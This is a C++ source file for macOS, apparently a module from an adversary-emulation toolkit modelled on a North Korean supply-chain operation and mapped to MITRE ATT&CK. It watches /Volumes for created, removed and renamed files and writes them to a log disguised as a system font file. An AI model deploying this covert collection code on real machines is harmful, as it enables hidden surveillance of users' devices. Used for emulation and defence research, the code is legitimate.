/*
* Run as Sudo
* Result: Program will hang and wait for an event. When an event occurs it will
* create the log file and print the same message to the terminal window.
*
* macho_monitorDevices
*      About:
*           Creates a thread using File System Events framework 
*           (CoreServices.framework) to monitor for changes to the provided path.
*      Result:
*           Writes all events related to the /Volumes path to a log file using
*           the same path as the network configuration file. 
*      MITRE ATT&CK Techniques:
*           T1119 Automated Collection
*           T1135 Network Share Discovery
*           T1082 System Information Discovery
*      CTI:
*           https://www.mandiant.com/resources/blog/north-korea-supply-chain
*/ 
#include "module.hpp"

void _logDeviceEvent(const std::string& message) {
    std::ofstream logfile("/Library/Fonts/AppleSDGothicNeo.ttc.1", std::ios_base::app);
    if (logfile.is_open()) {
        time_t now = time(0);
        tm* ltm = localtime(&now);
        char timestamp[20];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", ltm);
        logfile << "[" << timestamp << "] " << message << std::endl;
        std::cout << "[" << timestamp << "] " << message << std::endl;
        logfile.close();
    } else {
        XorLogger::LogError("Failed to write to log file");
    }
}

void _callback(ConstFSEventStreamRef streamRef,
              void *clientCallBackInfo,
              size_t numEvents,
              void *eventPaths,
              const FSEventStreamEventFlags eventFlags[],
              const FSEventStreamEventId eventIds[]) {

    char **paths = (char **)eventPaths;
    
    for (int i=0; i<numEvents; i++) {
        std::string message = "Event: ";
        if (eventFlags[i] & kFSEventStreamEventFlagItemCreated)
            message += "Created " + std::string(paths[i]);
        if (eventFlags[i] & kFSEventStreamEventFlagItemRemoved)
            message += "Removed " + std::string(paths[i]);
        if (eventFlags[i] & kFSEventStreamEventFlagItemModified)
            message += "Modified " + std::string(paths[i]);
        if (eventFlags[i] & kFSEventStreamEventFlagItemRenamed)
            message += "Renamed " + std::string(paths[i]);
        
        _logDeviceEvent(message);
    }
}

void monitorDevices(const char* path){
    if (path == nullptr){
        XorLogger::LogError("Path passed to `monitorDevices` is null.");
        return;
    }

    CFStringRef pathPtr = CFStringCreateWithCString(NULL, path, kCFStringEncodingUTF8);
    if (pathPtr == nullptr){
        XorLogger::LogError("Failed to create CFString from CString, path is null.");
        return;
    }
    CFArrayRef pathsToWatch = CFArrayCreate(NULL, (const void **)&pathPtr, 1, NULL);
    if (pathsToWatch == nullptr) {
        XorLogger::LogError("Failed to create CFArrayRef for path to monitor.");
        CFRelease(pathPtr);
        return;
    }
    FSEventStreamContext context = {0, NULL, NULL, NULL, NULL};
    if (context.info != nullptr) {
        XorLogger::LogError("Failed to initialize FSEventStreamContext");
        CFRelease(pathPtr);
        CFRelease(pathsToWatch);
        return;
    }
    FSEventStreamRef stream = FSEventStreamCreate(NULL,
                                 &_callback,
                                 &context,
                                 pathsToWatch,
                                 kFSEventStreamEventIdSinceNow,
                                 1.0,
                                 kFSEventStreamCreateFlagFileEvents);
    if (stream == NULL) {
        XorLogger::LogError("Failed to create FSEventStream for device monitoring");
        CFRelease(pathPtr);
        CFRelease(pathsToWatch);
        return;
    }
    FSEventStreamScheduleWithRunLoop(stream, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
    if (!FSEventStreamStart(stream)) {
        XorLogger::LogError("Failed to start FSEventStream to monitor devices");
        CFRelease(pathPtr);
        CFRelease(pathsToWatch);
        FSEventStreamRelease(stream);
        return;
}
    FSEventStreamStart(stream);
    CFRunLoopRun();
}

int main(){
    // Start the monitor
    monitorDevices("/Volumes");
    return 0;
}